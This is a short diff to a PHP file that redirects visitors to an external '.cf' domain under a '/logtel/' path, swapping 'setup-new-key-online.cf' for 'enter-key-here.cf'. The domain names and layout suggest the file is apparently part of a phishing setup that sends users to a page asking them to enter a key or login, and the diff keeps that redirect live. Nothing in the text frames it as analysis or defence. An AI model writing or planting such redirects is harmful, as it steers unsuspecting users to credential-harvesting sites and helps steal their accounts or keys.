@@ -1,4 +1,4 @@
 <?php
-header("Location: https://setup-new-key-online.cf/logtel/");
+header("Location: https://enter-key-here.cf/logtel/");
 die();
 ?>
